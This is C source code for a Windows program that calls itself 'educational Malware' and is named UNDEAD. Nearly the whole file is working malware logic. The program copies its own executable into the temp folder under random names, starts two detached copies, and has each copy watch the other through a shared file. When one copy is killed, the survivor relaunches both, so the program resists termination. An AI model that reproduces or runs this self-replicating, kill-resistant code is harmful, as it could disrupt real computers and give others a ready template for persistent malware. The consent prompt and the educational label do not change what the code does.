#include <windows.h>
#include <time.h>
#include <fcntl.h>
#include <stdio.h>

#define VERSION 0x1

char* ids[2];
char* connector;

int start_up();

void print_skull(){
	printf("\t\n         _,.-------.,_\n     ,;~\'             \'~;, \n   ,;                     ;,\n  ;                         ;\n ,\'                         \',\n,;                           ;,\n; ;      .           .      ; ;\n| ;   ______       ______   ; | \n|  `/~\"     ~\" . \"~     \"~\\\'  |\n|  ~  ,-~~~^~, | ,~^~~~-,  ~  |\n |   |        }:{        |   | \n |   l       / | \\       !   |\n .~  (__,.--\" .^. \"--.,__)  ~. \n |     ---;\' / | \\ `;---     |  \n  \\__.       \\/^\\/       .__/  \n   V| \\                 / |V  \n    | |T~\\___!___!___/~T| |  \n    | |`IIII_I_I_I_IIII\'| |  \n    |  \\,III I I I III,/  |  \n     \\   `~~~~~~~~~~\'    /\n       \\   .       .   /\n         \\.    ^    ./   \n           ^~~~^~~~^ \n\n");
}

DWORD WINAPI core_payload(LPVOID connectionStatus){
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	freopen("CONIN$", "r", stdin);
	char data[1024];
	memset(data, 0, 1024);
	strcat(data, ids[0]);
	strcat(data, "\n");
	strcat(data, "\n");
	strcat(data, ids[1]);
	//int result = MessageBox(NULL, "You cannot kill me!", "Hi!",  MB_YESNO);
	print_skull();
	printf("You cannot Kill Me!!\n\n");
}

int copy_file(char* src, char* dest){
	return CopyFile(src, dest, FALSE);
}

char *randstring(size_t length) {
	static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char *randomString = NULL;
	if (length) {
        	randomString = (char*)malloc(4096);
		if (randomString) {       
			memset(randomString, 0, (4096));
			strcat(randomString, "UNDEAD_");
			for (int n = 7;n < length;n++) {            
				int key = rand() % (int)(sizeof(charset) -1);
				randomString[n] = charset[key];
			}
			randomString[length] = '\0';
		}		
	}
	return randomString;
}


// https://stackoverflow.com/questions/2328182/prepending-to-a-string
void prepend(char* s, const char* t)
{
	size_t len = strlen(t);
	memmove(s + len, s, strlen(s) + 1);
	memcpy(s, t, len);
}


DWORD WINAPI connections(LPVOID connectorName){
	int mode = 0;
	while(1){
		int file = open((char*)connector, O_RDWR | O_CREAT | O_BINARY, 0777);
		if(mode == 0){
			write(file, ids[0], 101);
			mode = 1;
			Sleep(500);
		}else if(mode == 1){
			char b[101];
			read(file, b, 101);
			if(strcmp(b, ids[1]) != 0){
				//int result = MessageBox(NULL, "OTHER KILLED!", "Hi!",  MB_YESNO);
				return start_up();
			}
			mode = 0;
		}
		close(file);
	}
}


int start_up_payload(int argc, char** argv){
	char* connectionStatus = malloc(1);
	*connectionStatus = 1;
	HANDLE connectThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)connections, (LPVOID)connectionStatus, 0, NULL);
	HANDLE coreThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)core_payload, (LPVOID)argv[1], 0, NULL);
	if (connectThread)
	{
		int return_state = WaitForSingleObject(connectThread, INFINITE);
		*connectionStatus = 0;
		return return_state;
	}
	return 0;
}

int go_to_temp(){
	char* tempFilePath = malloc(1000);
	GetTempPathA(128, tempFilePath);
	SetCurrentDirectory(tempFilePath);
}

int start_up(){
	go_to_temp();
	char* tmpFileName = randstring(65);
	char* tmpFileName1 = randstring(65);
	strcat(tmpFileName1, ".exe");
	char* tmpFileName2 = randstring(65);
	strcat(tmpFileName2, ".exe");
	char selfPath[1024];
	char buffer[1024];
	char id1 = rand()%26+65;
	char id2 = rand()%26+65;

	GetModuleFileName(NULL, selfPath, MAX_PATH);
	copy_file(selfPath, tmpFileName1);
	copy_file(selfPath, tmpFileName2);

	strcat(tmpFileName1, " ");
	strcat(tmpFileName1, tmpFileName);
	strcat(tmpFileName1, " ");

	memset(buffer, 0, 1024);
	itoa(id1, buffer, 10);
	strcat(tmpFileName1, buffer);
	strcat(tmpFileName1, " ");

	memset(buffer, 0, 1024);
	itoa(id2, buffer, 10);
	strcat(tmpFileName1, buffer);


	strcat(tmpFileName2, " ");
	strcat(tmpFileName2, tmpFileName);
	strcat(tmpFileName2, " ");

	memset(buffer, 0, 1024);
	itoa(id2, buffer, 10);
	strcat(tmpFileName2, buffer);
	strcat(tmpFileName2, " ");


	memset(buffer, 0, 1024);
	itoa(id1, buffer, 10);
	strcat(tmpFileName2, buffer);

	STARTUPINFO sti = {sizeof(sti)};
	PROCESS_INFORMATION pi;
	int result1 = CreateProcessA(
		NULL,
		tmpFileName1,
		NULL,
		NULL,	
		FALSE,
		DETACHED_PROCESS,
		NULL,
		NULL,
		&sti,
		&pi
		);
	Sleep(250);
	int result2 =  CreateProcessA(
		NULL,
		tmpFileName2,
		NULL,
		NULL,	
		FALSE,
		DETACHED_PROCESS,
		NULL,
		NULL,
		&sti,
		&pi
		);
	CreateFileA(
		tmpFileName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);
	free(tmpFileName1);
	free(tmpFileName2);
}

void on_kill(){
	printf("Killed!\n");
	// TODO: Self Delete if selfID > 0
}

void consent(){
	const int result = MessageBox(NULL, "This is an educational Malware!\n\nIf you click ok you are reponsible for what happens with your computer!", "Are you sure?",  MB_YESNO);

	switch (result)
	{
		case IDYES:
    	return;
		break;
		case IDNO:
		exit(0);
		break;
	}
}

int main(int argc, char** argv, char** envp){
	argv[0] = "UNDEAD - You Cant Kill Me!";
	srand(time(NULL));
	// ShowWindow(GetConsoleWindow(), SW_HIDE);
	atexit(on_kill);
	if(argc == 4){
		connector = argv[1];
		int selfID = atoi(argv[2]);
		srand(selfID);
		ids[0] = randstring(100);
		int otherID = atoi(argv[3]);
		srand(otherID);
		ids[1] = randstring(100);
		start_up_payload(argc, argv);		
	}else if(argc == 1){
		consent();
		start_up();
		start_up();
	}
	exit(0);
}